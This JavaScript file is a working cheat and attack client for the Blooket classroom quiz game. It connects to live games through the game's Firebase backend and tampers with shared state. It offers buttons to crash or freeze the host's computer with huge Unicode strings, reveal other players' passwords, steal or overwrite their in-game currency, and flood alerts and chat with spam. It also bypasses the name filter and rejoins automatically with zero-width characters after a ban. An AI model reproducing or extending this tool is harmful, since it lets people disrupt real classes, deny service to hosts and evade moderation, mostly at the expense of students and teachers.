["Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Alpaca","Dog","Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox","Raccoon","Squirrel","Owl","Hedgehog","Deer","Wolf","Beaver","Tiger","Orangutan","Cockatoo","Parrot","Anaconda","Jaguar","Macaw","Toucan","Panther","Capuchin","Gorilla","Hippo","Rhino","Giraffe","Snowy Owl","Polar Bear","Arctic Fox","Baby Penguin","Penguin","Arctic Hare","Seal","Walrus","Witch","Wizard","Elf","Fairy","Slime Monster","Jester","Dragon","Queen","Unicorn","King","Two of Spades","Eat Me","Drink Me","Alice","Queen of Hearts","Dormouse","White Rabbit","Cheshire Cat","Caterpillar","Mad Hatter","King of Hearts","Toast","Cereal","Yogurt","Breakfast Combo","Orange Juice","Milk","Waffle","Pancakes","French Toast","Pizza","Earth","Meteor","Stars","Alien","Planet","UFO","Spaceship","Astronaut","Lil Bot","Lovely Bot","Angry Bot","Happy Bot","Watson","Buddy Bot","Brainy Bot","Mega Bot","Old Boot","Jellyfish","Clownfish","Frog","Crab","Pufferfish","Blobfish","Octopus","Narwhal","Dolphin","Baby Shark","Megalodon","Panda","Sloth","Tenrec","Flamingo","Zebra","Elephant","Lemur","Peacock","Chameleon","Lion","Amber","Dino Egg","Dino Fossil","Stegosaurus","Velociraptor","Brontosaurus","Triceratops","Tyrannosaurus Rex","Ice Bat","Ice Bug","Ice Elemental","Rock Monster","Dink","Donk","Bush Monster","Yeti","Dingo","Echidna","Koala","Kookaburra","Platypus","Joey","Kangaroo","Crocodile","Sugar Glider","Deckhand","Buccaneer","Swashbuckler","Treasure Map","Seagull","Jolly Pirate","Pirate Ship","Kraken","Captain Blackbeard","Snow Globe","Holiday Gift","Hot Chocolate","Holiday Wreath","Stocking","Gingerbread Man","Gingerbread House","Reindeer","Snowman","Santa Claus","Pumpkin","Swamp Monster","Frankenstein","Vampire","Zombie","Mummy","Caramel Apple","Candy Corn","Werewolf","Ghost","Rainbow Jellyfish","Blizzard Clownfish","Lovely Frog","Lucky Frog","Spring Frog","Poison Dart Frog","Lucky Hamster","Chocolate Rabbit","Spring Rabbit","Lemon Crab","Pirate Pufferfish","Donut Blobfish","Crimson Octopus","Rainbow Narwhal","Frost Wreath","Tropical Globe","New York Snow Globe","London Snow Globe","Japan Snow Globe","Egypt Snow Globe","Paris Snow Globe","Red Sweater Snowman","Blue Sweater Snowman","Elf Sweater Snowman","Santa Claws","Cookies Combo","Chilly Flamingo","Snowy Bush Monster","Nutcracker Koala","Sandwich","Ice Slime","Frozen Fossil","Ice Crab","Rainbow Panda","White Peacock","Tiger Zebra","Teal Platypus","Red Astronaut","Orange Astronaut","Yellow Astronaut","Lime Astronaut","Green Astronaut","Cyan Astronaut","Blue Astronaut","Pink Astronaut","Purple Astronaut","Brown Astronaut","Black Astronaut","Lovely Planet","Lovely Peacock","Haunted Pumpkin","Pumpkin Cookie","Ghost Cookie","Red Gummy Bear","Blue Gummy Bear","Green Gummy Bear","Chick Chicken","Chicken Chick","Raccoon Bandit","Owl Sheriff","Vampire Frog","Pumpkin King","Leprechaun","Anaconda Wizard","Spooky Pumpkin","Spooky Mummy","Agent Owl","Master Elf","Party Pig","Wise Owl","Spooky Ghost","Phantom King","Tim the Alien","Rainbow Astronaut","Hamsta Claus","Light Blue","Black","Red","Purple","Pink","Orange","Lime","Green","Teal","Tan","Maroon","Gray","Mint","Salmon","Burgandy","Baby Blue","Dust","Brown","Dull Blue","Yellow","Blue"];
//BLOOK DEFINITIONS END
var fblooks = ["Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Alpaca","Dog","Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox","Raccoon","Squirrel","Owl","Hedgehog","Deer","Wolf","Beaver","Tiger","Orangutan","Cockatoo","Parrot","Anaconda","Jaguar","Macaw","Toucan","Panther","Capuchin"];
var botinfo = {};
var gameobject = {};
var tokens = [];
var oname;
var unreads = 0;
var cheats = {"Hack":[{
type:"button",name:"Crash host(crypto)",action:function(a){setUserVal("cr/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("tat/t","t");}else{setUserVal("tat","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"button",name:"Turn Host Screen Green",action:function(a){if(a.green!=undefined){a.green=!a.green;}else{a.green=true;}if(a.green){setUserVal("cr",(function(){var t = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";for(var i = 0;i<300000;i++){t+=String.fromCharCode(3655);if((i%61)===0){t+=String.fromCharCode(32);}}t+="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";return t;})());}else{setUserVal("cr",0);}a.innerText=a.green?"Ungreen Host Screen":"Turn Host Screen Green";}
},{
type:"button",name:"Set Crash Password",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("p/toString","t");}else{setUserVal("p","DogLover3");}a.innerText=a.frozen?"Remove Crash Password":"Set Crash Password";}
},{
type:"button",name:"Set Freeze Password",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("p",genCursed());}else{setUserVal("p","DogLover3");}a.innerText=a.frozen?"Remove Freeze Password":"Set Freeze Password";}
},{
type:"input",name:"Set Crypto",action:function(amt){setUserVal("cr",amt);}
},{
type:"input",name:"Set Password",action:function(val){setUserVal("p",val);}
},{
type:"select",name:"Get User Password",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){alert(gameobject?.c?.[d]?.p);}
},{
type:"select",name:"Steal Crypto From",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:${prompt("How much crypto do you want to steal?")}`);}
},{
type:"input",name:"Advertise Text",action:function(adtext){setUserVal("cr",(function(){var r = new Array(100).fill("1").join("");for(var i = 0;i<500;i++){r+=adtext;if(i%10===0){r+="\n\r"}else{r+=" ";}}return r;})())}
},{
type:"select",name:"Send Ad Text",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){var adtext = prompt("Enter the text you would like to send (this will override your blook):");if(adtext){if(adtext.includes(":")){alert("Ad text cannot include a colon!");return;}setUserVal("b","Parrot:"+(function(){var r = "";for(var i = 0;i<500;i++){r+=adtext+" ";}return r;})());setUserVal("tat",`${d}:100`);}}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("tat",`${botinfo.name}:${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Gold":[{
type:"button",name:"Crash host(gold)",action:function(a){setUserVal("g/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("tat/t","t");}else{setUserVal("tat","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"select",name:"Steal Gold From",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:${prompt("How much gold do you want to steal?")}`);}
},
{
type:"select",name:"Set Player's Gold",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:swap:${prompt("What do you want to set it to?")}`);}
},{
type:"input",name:"Set Gold",action:function(amt){setUserVal("g",amt);}
},{
type:"select",name:"Send Ad Text",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){var adtext = prompt("Enter the text you would like to send (this will override your blook):");if(adtext){if(adtext.includes(":")){alert("Ad text cannot include a colon!");return;}setUserVal("b","Dog:"+(new Array(500).fill(adtext).join(" ")));setUserVal("tat",`${d}:100`);}}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("tat",`${botinfo.name}:${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Defense2":[{
type:"button",name:"Crash host(defense2)",action:function(a){setUserVal("d/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("r/toString","t");}else{setUserVal("r",1);}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Damage",action:function(amt){setUserVal("d",amt);}
},{
type:"input",name:"Set Round",action:function(round){setUserVal("r",round);}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("r",`${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Defense":[{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("d/toString","t");}else{setUserVal("d",0);}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Damage",action:function(amt){setUserVal("d",amt);}
}],"Fish":[{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("f/t","t");}else{setUserVal("f","Old Boot");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Weight",action:function(amt){setUserVal("w",amt);}
},{
type:"input",name:"Set Caught Fish",action:function(fish){setUserVal("f",fish);}
},{
type:"input",name:"Send Distraction",action:function(d){setUserVal("s",true);setUserVal("f",d);}
}],"Pirate":[{
type:"button",name:"Crash host(pirate)",action:function(a){setUserVal("d/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("tat/t","t");}else{setUserVal("tat","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"select",name:"Steal Doubloons From",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:${prompt("How many doubloons do you want to steal?")}`);}
},{
type:"input",name:"Set Doubloons",action:function(d){setUserVal("d",d);}
},{
type:"select",name:"Send Ad Text",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){var adtext = prompt("Enter the text you would like to send (this will override your blook):");if(adtext){if(adtext.includes(":")){alert("Ad text cannot include a colon!");return;}setUserVal("b","Parrot:"+(function(){var r = "";for(var i = 0;i<500;i++){r+=adtext+" ";}return r;})());setUserVal("tat",`${d}:100`);}}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("tat",`${botinfo.name}:${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Dino":[{
type:"button",name:"Crash host(dino)",action:function(a){setUserVal("f/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("tat/t","t");}else{setUserVal("tat","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Fossils",action:function(d){setUserVal("f",d);}
},{
type:"staticsel",name:"Set Cheating",values:["true","false"],action:function(d){setUserVal("ic",d);}
},{
type:"select",name:"Catch Player Cheating",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:true`);}
}],"Cafe":[{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("tat/t","t");}else{setUserVal("tat","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Cash",action:function(d){setUserVal("ca",d);}
},{
type:"input",name:"Set Upgrade(ex. Cereal:1)",action:function(d){setUserVal("up",d);}
},{
type:"select",name:"Attack player",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:${prompt("What attack do you want(inspect, pay, etc)?")}`);}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("up",`a:${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Brawl":[{
type:"button",name:"Crash host(brawl)",action:function(a){setUserVal("xp/t","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("up/t","t");}else{setUserVal("up","Dark Energy:2");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set XP",action:function(a){setUserVal("xp",a);}
},{
type:"input",name:"Set Upgrade(upgrade:level)",action:function(a){setUserVal("up",a);}
},{
type:"input",name:"Flood Alert Box",action:function(stext){setUserVal("up",`__proto__:${Date.now()}${(new Array(1700).fill(stext+" ")).join("")}`);}
}],"Racing":[{
type:"button",name:"Freeze Scoreboard and Attacks",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("pr/toString","t");}else{setUserVal("pr",0);}a.innerText=a.frozen?"Unfreeze Scoreboard and Attacks":"Freeze Scoreboard and Attacks";}
},{
type:"input",name:"Set Questions Left",action:function(a){setUserVal("pr",gameobject.s.a-parseInt(a));}
},{
type:"select",name:"Attack player",computed:function(sel){if(Object.keys(gameobject.c).length===Array.from(sel.children).length){return false;}return Object.keys(gameobject.c);},action:function(d){setUserVal("tat",`${d}:${prompt("Which attack do you want to perform(rocket,etc)?")}`);}
}],"Classic":[{
type:"button",name:"Freeze Question",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("a/toString","t");}else{setUserVal("a",1);}a.innerText=a.frozen?"Unfreeze Question":"Freeze Question";}
}],"Royale":[{
type:"button",name:"Send Crash Answer",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`,"t");}else{setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`,2);}a.innerText=a.frozen?"Unsend Crash Answer":"Send Crash Answer";}
}],"Rush":[{
type:"button",name:"Freeze Host's Computer",action:function(a){setUserVal("bs",1e+307);a.innerHTML="He aint coming back from this one!";}
},{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("d/toString","t");}else{setUserVal("d","t");}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"input",name:"Set Blooks",action:function(b){setUserVal("bs",b);}
},{
type:"input",name:"Set Defense",action:function(b){setUserVal("d",b);}
},{
type:"input",name:"Advertise Text",action:function(adtext){setUserVal("d",(function(){var r = "";for(var i = 0;i<100;i++){r+="1";}for(var i = 0;i<500;i++){r+=adtext;if(i%10===0){r+="\n\r"}else{r+=" ";}}return r;})())}
}],"Rush (teams)":[{
type:"button",name:"Freeze Host's Computer",action:function(a){setTeamVal("bs",1e+307);a.innerHTML="He aint coming back from this one!";}
},{
type:"input",name:"Set Blooks",action:function(b){setTeamVal("bs",parseInt(b));}
},{
type:"input",name:"Set Defense",action:function(b){setTeamVal("d",parseInt(b));}
}],"Factory":[{
type:"button",name:"Freeze Scoreboard",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){setUserVal("ca/toString","t");}else{setUserVal("ca",0);}a.innerText=a.frozen?"Unfreeze Scoreboard":"Freeze Scoreboard";}
},{
type:"staticsel",name:"Send Distraction",values:["dp"],action:function(val){setUserVal("tat",val);}
},{
type:"input",name:"Set Cash",action:function(b){setUserVal("ca",b);}
}]};
var global = [{
type:"staticsel",name:"Set Blook",values:blooks,action:function(val){setUserVal("b",val);}
},{
type:"input",name:"Set Custom Blook URL",action:function(val){setUserVal("b",val);}
},{
type:"input",name:"Set Blook Ad Text",action:function(at){setUserVal("b",(new Array(600).fill(at).join(" ")));}
},{
type:"input",name:"Set Banner",action:function(b){setUserVal("bg",b);}
},{
type:"button",name:"Leave Game",action:function(a){leaveGame();finishG();a.innerText="Leaving";}
},{
type:"button",name:"Crash host",action:function(a){setUserVal("b/toString","t");a.innerText="Crashing";}
},{
type:"button",name:"Freeze Host",action:function(a){setUserVal("b",genCursed());a.innerText="Freezing";}
},{
type:"button",name:"Open Chat",id:"ochat",action:function(a){if(a.frozen!=undefined){a.frozen=!a.frozen;}else{a.frozen=true;}if(a.frozen){unreads=0;updateUnreads();document.querySelector(".chat").style.display="block";}else{document.querySelector(".chat").style.display="none";}a.innerText=a.frozen?"Close Chat":"Open Chat";}
}];
function updateUnreads(){
document.querySelector("#ochat").innerHTML = unreads>0 ? `Open Chat <b style="color:#f00000;">(${unreads})</b>` : "Open Chat";
}
var ci = 0;function sendChatMsg(msg){setUserVal("msg",{msg:msg,i:ci});ci++;}
function setTeamVal(path,val){return setVal(`/${botinfo.gid}/a/${botinfo.name}/${path}`,val);}
//ben sucks at coding guys bro uses base64 for his images
//if you're reading this I hope blooket goes bankrupt because of all the poor kids you have scammed
function onUpdateData(datav){
	if(!gameobject || !gameobject.s){
	onFirstData(datav);
	}else{
	onData(datav);
        handleChat(datav);
}
	gameobject=datav;}
function onBlock(data){
  
}

function handleChat(data){
var users = data.c;
var pusers = gameobject.c;
    for(var i in users){
        if(users[i]?.msg?.msg){
if(pusers[i]?.msg?.msg){
        if(users[i].msg.i!==pusers[i].msg.i){
            onChat(users[i].msg.msg,i);
        }
} else {onChat(users[i].msg.msg,i);
}

        }
    }
}
function onChat(msg,name){
addChatMessage(`${name}: ${msg}`);
if(document.querySelector(".chat").style.display == "none"){
unreads++;
updateUnreads();}
}
function joinGame(code,name,icog){
    if(botinfo.connecting){errorBar("Connecting to game, please wait...");return;}
    if(document.getElementById("bcf").getAttribute("checked")){name=bypassFilter(name);}
    if(document.getElementById("fpswitch").getAttribute("checked")){name=String.fromCharCode(32)+String.fromCharCode(32)+name;}
    oname = name;
    connect(code,name,icog);
}
//setVal(`/${botinfo.gid}/a/${botinfo.name}/d`,56)
function onFirstData(d){
var gm = d.s.t;
if(gm==="Rush"){
if(d.s.m==="Teams"){gm="Rush (teams)";}
}
console.log("Game type: " + gm);
renderCheats(gm);}
function onData(d){
if(!d){console.log("Game disconnected!");errorBar("Game crashed!");leaveGame();finishG();return;}
procData(d);
if(gameobject.c[botinfo.name]){
if(gameobject.c[botinfo.name].tat && !d.c[botinfo.name].tat){
alert("Attack complete!");
}}
if(d.stg==="fin"&&botinfo.connected){botinfo.connected=false;console.log("Game ended!");console.log("Time: " + getTime());leaveGame();finishG();return;}
}
function procData(data){}
function leaveGame(){
if(botinfo.connected){setUserVal("",{});botinfo.fbdb=false;deleteApp(botinfo.liveApp);botinfo.connected=false;botinfo.liveApp=false;gameobject={};updateStatus("Ready");}
}
function getTime(){var v = ((Date.now() - new Date(gameobject.s.d).getTime())/60000);return Math.floor(v) + ":" + Math.floor(v*60)%60;}
function zalgo(text,h=15){
const a = new Lunicode();
a.tools.creepify.options.maxHeight = h;
return a.tools.creepify.encode(text);
}
var chars = ["\u202E","\u4FFF","\u4F52","\u2F9F","\u0E47","\u0E47","\u0E47","\u0E47","\u0E47","\u0E47","\u4FF1","\u4FF2"];
function makeLongText(a){
    return new Array(a).fill().map(e=>chars[Math.floor(Math.random()*chars.length)]).join("");
}
function genCursed(){
  return makeLongText(3e+6);
}
function activateAuto(){
  var rejoining = 0;
onBlock = async e=>{
if(Object.keys(e).includes(botinfo.name)&&!rejoining){rejoining=1;await rejoinGame();rejoining=0;}
}
var i = 0;
async function rejoinGame(){
const token = await genToken(botinfo.gid,oname+genInvis(i));
await useToken(token);
i++;
}
var chars = ["\u200B","\u200C","\u200D","\u200E","\u200F"];
function genInvis(i){
return i.toString(5).split("").map(e=>chars[e.charCodeAt()-48]).join("");
}
}

//DOM FUNCTIONS:
document.querySelector("#gcode").addEventListener("keydown",e=>{if(e.keyCode==13){join();}});
document.querySelector("#gname").addEventListener("keydown",e=>{if(e.keyCode==13){join();}});
function createNormText(text){var a = document.createElement("div");a.className="normtext";a.innerText=text;return a;}
function createCheatContainer(){
var a = document.createElement("div");
a.className="cheatcontainer";
return a;
}
function updateStatus(text){var s = document.getElementById("status");s.innerText="Status: "+text;}
function createButton(text,clickaction){var button = document.createElement("button");button.innerText=text;button.addEventListener("click",function(){clickaction(button);});return button;}
function renderCheats(gm){
var c = document.getElementById("ctrlpanel");
var codep = document.getElementById("cc");
codep.style.display="none";c.appendChild(createNormText("Bot Successful! Type: " + gm));
if(cheats[gm]){c.appendChild(createNormText("Cheats: ")); var chc = createCheatContainer();
cheats[gm].forEach(e=>{
switch(e.type){case "button":chc.appendChild(createButton(e.name,e.action));break;case "input":chc.appendChild(createInp(e.name,e.action));break;case "select":chc.appendChild(createSel(e.name,e.computed,e.action));break;case "staticsel":chc.appendChild(createStaticSel(e.name,e.values,e.action));break;default:console.log("Unsupported!");break;}
});
c.appendChild(chc);}
c.appendChild(createNormText("Global Cheats:"));
c.appendChild(createGlobalContainer());
}
function finishG(){
var cp = document.getElementById("ctrlpanel");
var cc = document.getElementById("cc");
document.querySelector(".chat").style.display="none";
cp.innerHTML="";cc.style.display="block";errorBar("Game Ended!");}
function createInp(text,action){var inp = document.createElement("div");inp.className="inputcontainer";var ti = document.createElement("div");ti.innerText=text+":";inp.appendChild(ti);var iv = document.createElement("input");inp.appendChild(iv);inp.addEventListener("click",function(e){if(e.target===iv){return;}action(iv.value);});return inp;}
//cpval is computed value function, call it to compute select options in array form

function createSel(text,cpval,action){var inp = document.createElement("div");inp.className="inputcontainer";var ti = document.createElement("div");ti.innerText=text+":";inp.appendChild(ti);var iv = document.createElement("select");iv.innerHTML="<option>Click to update</option>";
iv.addEventListener("click",function(e){var rvals = cpval(iv);if(rvals){iv.innerHTML="";rvals.sort().forEach(e=>{var opt = document.createElement("option");opt.innerText=e;iv.appendChild(opt);});}});
inp.appendChild(iv);inp.addEventListener("click",function(e){if(e.target===iv){return;}action(iv.value);});return inp;}

function createGlobalContainer(){
var chc = createCheatContainer();
global.forEach(e=>{
switch(e.type){case "button":let b = createButton(e.name,e.action);if(e.id){b.id=e.id;}chc.appendChild(b);break;case "input":chc.appendChild(createInp(e.name,e.action));break;case "select":chc.appendChild(createSel(e.name,e.computed,e.action));break;case "staticsel":chc.appendChild(createStaticSel(e.name,e.values,e.action));break;default:console.log("Unsupported!");break;}
});
return chc;
}
function createStaticSel(text,vals,action){var inp = document.createElement("div");inp.className="inputcontainer";var ti = document.createElement("div");ti.innerText=text+":";inp.appendChild(ti);var iv = document.createElement("select");vals.sort().forEach(e=>{var opt = document.createElement("option");opt.innerText=e;iv.appendChild(opt);});inp.appendChild(iv);inp.addEventListener("click",function(e){if(e.target===iv){return;}action(iv.value);});return inp;}
function findGameCode(str) {
  const regex = /\b\d{7}\b/;
  const match = str.match(regex);
  if (match) {
    return match[0];
  } else {
    return null;
  }
}
//CHAT CODE
var dragging = false; var prevpos = {x:0,y:0};document.querySelector("#drag").addEventListener("mousedown",e=>{dragging=true;});document.body.addEventListener("mousemove",function(e){if(dragging){

document.querySelector(".chat").style.left = parseInt(document.querySelector(".chat").style.left) + e.clientX-prevpos.x +"px";document.querySelector(".chat").style.top = parseInt(document.querySelector(".chat").style.top) + e.clientY-prevpos.y +"px";

}
prevpos = {x:e.clientX,y:e.clientY};});
document.querySelector("#chat").addEventListener("keydown",e=>{
if(e.keyCode==13){var msg = document.querySelector("#chat").value;if(msg[0]=="/"){processCmd(msg);}else{sendChatMsg(msg);}document.querySelector("#chat").value = "";}
});
function processCmd(msg){
var cmd = msg.split("/")[1];
switch(cmd){
case "clear":
document.querySelector(".chatcontainer").innerHTML = `<div class="chatmsg"></div>`;
break;
case "help":
addChatMessage("Available Commands: /clear (clears chat window), /help (shows this menu)");
break;
}
}
document.querySelector("#drag").addEventListener("mouseup",e=>{dragging=false;});
async function genToken(gid,name){
const {fbToken,fbShardURL} = await fetch("join",{body:JSON.stringify({id:gid,name:name}),headers:{"Content-Type":"application/json"},method:"POST"}).then(e=>e.json());
return {gid,name,fbToken,fbShardURL};
}
async function useToken(token){
const {gid,name,fbToken,fbShardURL} = token;
await connect(gid,name,document.getElementById("icogmode").getAttribute("checked"),{success:!0,fbShardURL,fbToken});
}
function recoverInfoFromFbToken(fbToken){
return JSON.parse(atob(token.split(".")[1]));
}
function addChatMessage(a){
var d = document.createElement("div");d.className = "chatmsg";d.innerText=a;document.querySelector(".chatcontainer").insertBefore(d,document.querySelector(".chatcontainer > div"));}
//CODE END
//CHECKMARK CODE
document.querySelectorAll("checkbox").forEach(e=>{e.addEventListener("click",function(){if(e.getAttribute("checked")){e.removeAttribute("checked");}else{e.setAttribute("checked","true");}});});
//END OF CHECKMARK CODE
function genMessage(msg,amt){var t = "";for(var i = 0;i<amt;i++){t+=msg+" ";}return t;}
document.querySelector("#gcode").addEventListener("keydown",function(e){if(e.keyCode===13){join();}});
document.querySelector("#gname").addEventListener("keydown",function(e){if(e.keyCode===13){join();}});
//firebase code
async function connect(gid,name,icog,reqbody=!1){
botinfo.connected = false;
botinfo.connecting = true;
botinfo.name = name;
botinfo.gid = gid;
updateStatus("Fetching token...");
const body = reqbody ? reqbody : await fetch("join",{body:JSON.stringify({id:gid,name:name}),headers:{"Content-Type":"application/json"},method:"POST"}).then(e=>e.json());
updateStatus("Connecting to game...");
if(body.success){
const liveApp = initializeApp({
                        apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
                        authDomain: "blooket-2020.firebaseapp.com",
                        projectId: "blooket-2020",
                        storageBucket: "blooket-2020.appspot.com",
                        messagingSenderId: "741533559105",
                        appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
                        measurementId: "G-S3H5NGN10Z",
                        databaseURL: body.fbShardURL
                    },Date.now().toString());
                    const auth = getAuth(liveApp);
                    await signInWithCustomToken(auth, body.fbToken);
                    const db =  getDatabase(liveApp);
await set(ref(db,`${gid}/c/${name}`),{b:icog?fblooks[Math.floor(Math.random()*fblooks.length)]:"Rainbow Astronaut",rt:!0});
botinfo.fbdb = db;
botinfo.liveApp = liveApp;
botinfo.connecting = false;
botinfo.connected = true;
updateStatus("Connected to game");
onValue(ref(db, `${gid}`),(data)=>{if(!botinfo.connected){return;}onUpdateData(data.val());});
onValue(ref(db, `${gid}/bu`),(data)=>{if(!botinfo.connected){return;}onBlock(data.val());});
}else{updateStatus("Ready");botinfo.connecting = false;errorBar("Connect error: " + body.msg);}
}
function bypassFilter(str){return str.split("").map(e=>`\u00AD${e}`).join("");}
async function setVal(path,val){
if(!botinfo.connected){errorBar("Cannot set value while disconnected!");return;}
if(!botinfo.fbdb){errorBar("Cannot set value when there is no game!");return;}
await set(ref(botinfo.fbdb,path),val);
}
async function setUserVal(path,val){
console.log(path,val);
await setVal(`/${botinfo.gid}/c/${botinfo.name}/${path}`,val);
}
updateStatus("Ready");
//end
